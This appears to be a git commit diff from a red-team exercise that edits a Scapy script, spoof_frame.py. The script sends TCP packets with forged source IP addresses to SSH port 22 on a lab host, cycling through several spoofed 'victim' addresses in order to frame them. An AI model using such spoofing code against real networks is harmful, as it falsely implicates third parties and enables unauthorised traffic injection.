af56e829723bb1ade417a77c9e5f07f08888d954
Jimi <jimi@kali.jimi>
2026-04-01 15:52:49 -0700

    Add multiple IPs for spoof

--- Team 1/RED/spoof_frame.py
+++ Team 1/RED/spoof_frame.py
@@ -1,8 +1,8 @@
 from scapy.all import IP, TCP, Raw, send, conf, RandShort
 
 # CONFIGURATION
-victim_ip = "192.168.56.200" # Let's use a "fake" high IP to avoid gateway issues
-target_ip = "192.168.56.102" 
+victim_ip = "192.168.56." # Let's use a "fake" high IP to avoid gateway issues
+target_ip = "192.168.56.4" 
 target_port = 22
 
 print(f"--- Launching Enhanced Spoofed Frame Job ---")
@@ -10,6 +10,10 @@ print(f"--- Launching Enhanced Spoofed Frame Job ---")
 # We wrap this in a loop to send 5 packets. 
 # Sometimes the first one gets swallowed by ARP requests.
 for i in range(5):
+    ip_suffix = "20" + str(i)
+    victim_ip = "192.168.56."
+    victim_ip = victim_ip + ip_suffix
+    print(victim_ip)
     # 'del' commands force Scapy to recalculate lengths and checksums automatically
     pkt = IP(src=victim_ip, dst=target_ip) / \
           TCP(sport=RandShort(), dport=target_port, flags="PA") / \
